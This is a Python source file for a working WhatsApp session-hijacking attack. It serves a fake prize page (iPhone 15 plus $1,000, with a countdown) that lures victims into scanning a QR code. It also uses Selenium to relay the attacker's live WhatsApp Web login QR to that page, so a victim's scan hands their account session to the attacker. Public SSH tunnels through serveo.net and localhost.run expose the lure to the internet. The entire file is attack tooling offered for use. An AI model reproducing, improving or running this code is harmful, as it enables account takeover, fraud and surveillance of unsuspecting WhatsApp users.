# Author: https://github.com/zr0n

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import base64
from time import sleep
import os
import http.server
import socketserver
import threading
import subprocess
import time
import requests
import random
import socket
import psutil
import signal

# Configurações - porta dinâmica para evitar conflitos
PhishING_PORT = random.randint(8000, 9000)

# HTML atualizado
PhishING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You have been selected!</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
        .container { Phish-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; }
        .qr-code { Phish-width: 300px; margin: 0 auto; }
        .qr-code img { width: 100%; height: auto; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="whatsapp-logo">📱</div>
        <h1>🎉 CONGRATULATIONS! YOU HAVE BEEN SELECTED! 🎉</h1>
        <div class="prize">🏆 PRIZE: iPhone 15 Pro Phish + $1,000 🏆</div>
        <p>To validate and claim your prize, <strong>log in to WhatsApp Web</strong> by scanning the QR Code below:</p>
        <div class="qr-container">
            <div class="qr-code">
                <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="WhatsApp QR Code" id="qrImage">
            </div>
        </div>
        <div class="timer">⏳ TIME LEFT: <span id="countdown">05:00</span></div>
        <div class="instructions">
            <h3>📋 How to claim your prize:</h3>
            <ol>
                <li>Open WhatsApp on your mobile phone</li>
                <li>Tap on <strong>Menu → WhatsApp Web</strong></li>
                <li>Point your camera to the QR Code above</li>
                <li>Your prize will be released automatically after login!</li>
            </ol>
        </div>
        <p><strong>⚠️ ATTENTION:</strong> You have only 5 minutes to scan the QR code and secure your prize!</p>
    </div>

    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 3000);
        }
        function startCountdown() {
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = "TIME EXPIRED!";
                    countdownElement.style.color = "#D32F2F";
                }
                timeLeft--;
            }, 1000);
        }
        updateQRCode();
        startCountdown();
        window.onload = function() {
            setTimeout(() => {
                alert("🎊 Congratulations! You’ve won an iPhone 15 + $1,000! Scan the QR Code with WhatsApp to claim it.");
            }, 1000);
        };
    </script>
</body>
</html>

"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_with_timestamp = PhishING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            self.wfile.write(html_with_timestamp.encode())
        elif self.path.startswith('/qr.png'):
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                with open('qr.png', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def kill_process_on_port(port):
    """Kills processes that are using the specified port"""
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                connections = proc.connections()
                for conn in connections:
                    if conn.laddr.port == port:
                        print(f"🔄 Killing process {proc.pid} using port {port}")
                        os.kill(proc.pid, signal.SIGTERM)
                        time.sleep(2)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        print(f"⚠️ Error killing processes on port {port}: {e}")

def find_available_port(start_port=8000, end_port=9000):
    """Finds an available port"""
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('', port))
                return port
        except OSError:
            continue
    raise Exception("No available port found")

def start_Phishing_server():
    """Starts the Phishing server with dynamic port handling"""
    global PhishING_PORT
    
    Phish_attempts = 5
    for attempt in range(Phish_attempts):
        try:
            # Try to kill processes on the current port
            kill_process_on_port(PhishING_PORT)
            
            with socketserver.TCPServer(("", PhishING_PORT), PhishingHandler) as httpd:
                print(f"✅ Phishing server running on port {PhishING_PORT}")
                httpd.serve_forever()
                break
                
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"⚠️ Port {PhishING_PORT} in use, trying another...")
                PhishING_PORT = find_available_port()
                time.sleep(1)
            else:
                print(f"❌ Server error: {e}")
                break
    else:
        print("❌ Could not start server after multiple attempts")

def check_port_open(host, port):
    """Checks if a port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def execute_ssh_tunnel(command, service_name, timeout=30):
    """Runs an SSH command and robustly captures the public URL"""
    try:
        print(f"🔧 Trying {service_name}...")
        
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        start_time = time.time()
        url = None
        
        # Monitor process output in real time
        while time.time() - start_time < timeout and url is None:
            if process.poll() is not None:
                break
                
            # Try to read stdout
            try:
                output = process.stdout.readline()
                if output:
                    print(f"[{service_name}] {output.strip()}")
                    
                    # Look for URLs in the output
                    if 'https://' in output and ('serveo.net' in output or 'lhr.life' in output or 'lhr.run' in output):
                        import re
                        patterns = [
                            r'https://[a-zA-Z0-9.-]+\.serveo\.net',
                            r'https://[a-zA-Z0-9.-]+\.lhr\.life',
                            r'https://[a-zA-Z0-9.-]+\.lhr\.run',
                        ]
                        
                        for pattern in patterns:
                            match = re.search(pattern, output)
                            if match:
                                url = match.group(0)
                                print(f"✅ {service_name} URL: {url}")
                                break
            except:
                pass
                
            time.sleep(0.5)
        
        if url:
            return url, process
        else:
            if process.poll() is None:
                process.terminate()
            return None, None
            
    except Exception as e:
        print(f"❌ Error in {service_name}: {e}")
        return None, None

def setup_simple_tunnel():
    """Sets up a simple public tunnel using available strategies"""
    strategies = [
        {
            'name': 'Serveo.net',
            'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30', '-R', '80:localhost:' + str(PhishING_PORT), 'serveo.net']
        },
        {
            'name': 'Localhost.run', 
            'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30', '-R', '80:localhost:' + str(PhishING_PORT), 'nokey@localhost.run']
        }
    ]
    
    for strategy in strategies:
        print(f"🔄 Trying {strategy['name']}...")
        url, process = execute_ssh_tunnel(strategy['command'], strategy['name'])
        if url:
            return url, process
        print(f"❌ {strategy['name']} failed")
    
    return None, None

def get_local_ips():
    """Gets local IP addresses and builds local access URLs"""
    local_ips = []
    try:
        # Localhost and primary local IP
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        local_ips.append(('localhost', f"http://localhost:{PhishING_PORT}"))
        local_ips.append(('Local IP', f"http://{local_ip}:{PhishING_PORT}"))
        
        # Network interfaces
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    if ip not in ['127.0.0.1', local_ip] and (ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.')):
                        local_ips.append(('Local Network', f"http://{ip}:{PhishING_PORT}"))
    except:
        local_ips.append(('localhost', f"http://localhost:{PhishING_PORT}"))
    
    return local_ips

def start_whatsapp_hijacking():
    """Starts the WhatsApp session hijacking routine"""
    print("\n📱 STARTING WHATSAPP SESSION HIJACKING")
    
    try:
        # Configure options to avoid common issues
        from selenium.webdriver.firefox.options import Options
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        
        browser = webdriver.Firefox(options=options)
        browser.get("https://web.whatsapp.com/")

        print("⏳ Waiting for QR Code...")
        try:
            # Try several selectors to find the QR canvas
            selectors = [
                "canvas",
                "div[data-ref] canvas",
                "canvas[aria-label='Scan me!']"
            ]
            
            canvas = None
            for selector in selectors:
                try:
                    canvas = WebDriverWait(browser, 20).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    print(f"✅ Canvas found with selector: {selector}")
                    break
                except:
                    continue
            
            if not canvas:
                raise Exception("Canvas not found with any selector")
                
        except Exception as e:
            print(f"❌ Error finding canvas: {e}")
            browser.quit()
            return None

        def get_canvas_base64():
            try:
                # Find canvas again and return its data URL
                canvas = browser.find_element(By.CSS_SELECTOR, "canvas")
                data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
                return data_url
            except Exception as e:
                print(f"⚠️ Error extracting QR Code: {e}")
                return None

        # Initial QR Code capture
        src = get_canvas_base64()
        if src:
            base64_data = src.replace("data:image/png;base64,", "")
            with open("qr.png", "wb") as f:
                f.write(base64.b64decode(base64_data))
            print("✅ Initial QR Code saved")
        else:
            print("❌ Failed to obtain initial QR Code")
            browser.quit()
            return None

        if os.path.isfile('hacked'):
            os.remove('hacked')

        print("🎯 Waiting for victim to scan the QR Code...")
        
        while True:
            # Try to click reload button if present
            try:
                reload_selectors = [
                    "//span[contains(text(), 'Recarregar')]",  # still checking original text as WhatsApp UI might be localized
                    "//span[contains(text(), 'Reload')]",
                    "//button[contains(., 'Recarregar')]",
                    "//button[contains(., 'Reload')]"
                ]
                
                for selector in reload_selectors:
                    try:
                        reload_button = browser.find_element(By.XPATH, selector)
                        reload_button.click()
                        print("🔄 QR Code reloaded")
                        time.sleep(2)
                        break
                    except:
                        continue
            except:
                pass

            # Check whether QR is still present or if login happened
            try:
                canvas = WebDriverWait(browser, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "canvas"))
                )
                new_src = get_canvas_base64()
                if new_src and new_src != src:
                    src = new_src
                    base64_data = new_src.replace("data:image/png;base64,", "")
                    with open("qr.png", "wb") as f:
                        f.write(base64.b64decode(base64_data))
                    print("✅ QR Code updated")
            except TimeoutException:
                print("🎉 VICTIM LOGGED IN! Session captured!")
                with open('hacked', 'w') as f:
                    f.write('')
                break
            except Exception as e:
                print(f"⚠️ Error: {e}")

            time.sleep(3)

        print("✅ WhatsApp session captured!")
        return browser
        
    except Exception as e:
        print(f"❌ Error in WhatsApp hijacking: {e}")
        return None

def main():
    print("🚀 STARTING PhishING + WHATSAPP HIJACKING ATTACK")
    print(f"🔧 Using port: {PhishING_PORT}")
    
    # Clear old processes on the port
    kill_process_on_port(PhishING_PORT)
    time.sleep(2)
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=start_Phishing_server, daemon=True)
    server_thread.start()
    
    # Wait for server to start
    print("⏳ Starting server...")
    time.sleep(3)
    
    # Check if server is running
    if not check_port_open('localhost', PhishING_PORT):
        print("❌ Server did not start correctly. Restarting...")
        kill_process_on_port(PhishING_PORT)
        time.sleep(2)
        server_thread = threading.Thread(target=start_Phishing_server, daemon=True)
        server_thread.start()
        time.sleep(3)
    
    # Get local URLs
    local_urls = get_local_ips()
    
    print(f"\n🎯 LOCAL ACCESS URLs:")
    for name, url in local_urls:
        print(f"   {name}: {url}")
    
    # Try to create a public tunnel
    print("\n🌐 SETTING UP PUBLIC TUNNEL...")
    tunnel_url, tunnel_process = setup_simple_tunnel()
    
    if tunnel_url:
        print(f"✅ Public Tunnel: {tunnel_url}")
    else:
        print("❌ Public tunnels failed. Using local access only.")
    
    # Start WhatsApp hijacking routine
    print("\n📱 STARTING WHATSAPP CAPTURE...")
    browser = start_whatsapp_hijacking()
    
    print("\n" + "="*60)
    print("✅ SYSTEM READY!")
    if tunnel_url:
        print(f"🌐 Public URL: {tunnel_url}")
    for name, url in local_urls[:2]:  # Show only the first 2 local URLs
        print(f"🏠 {name}: {url}")
    print("⏹️  Press Ctrl+C to stop")
    print("="*60)
    
    # Keep the system running and monitor
    try:
        while True:
            time.sleep(10)
            # Check if server is still running
            if not check_port_open('localhost', PhishING_PORT):
                print("⚠️ Server crashed! Restarting...")
                server_thread = threading.Thread(target=start_Phishing_server, daemon=True)
                server_thread.start()
                time.sleep(3)
                
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        if browser:
            try:
                browser.quit()
            except:
                pass
        kill_process_on_port(PhishING_PORT)

if __name__ == "__main__":
    main()
